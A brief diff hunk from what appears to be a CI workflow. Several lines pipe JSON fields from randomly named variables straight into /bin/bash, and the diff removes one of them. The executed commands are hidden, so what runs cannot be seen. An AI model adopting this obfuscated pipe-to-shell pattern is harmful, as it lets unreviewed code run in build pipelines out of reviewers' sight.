@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$g04" | jq -r .dj79160 | /bin/bash
           printf '%s' "$jloqp8" | jq -r .sog04219 | /bin/bash
           printf '%s' "$qwtd79419" | jq -r .t147 | /bin/bash
-          echo $hy1 | jq -r .bxgh02219 | /bin/bash
           printf '%s' "$lvnek38" | jq -r .gtxd97 | /bin/bash
 
       - name: Save results
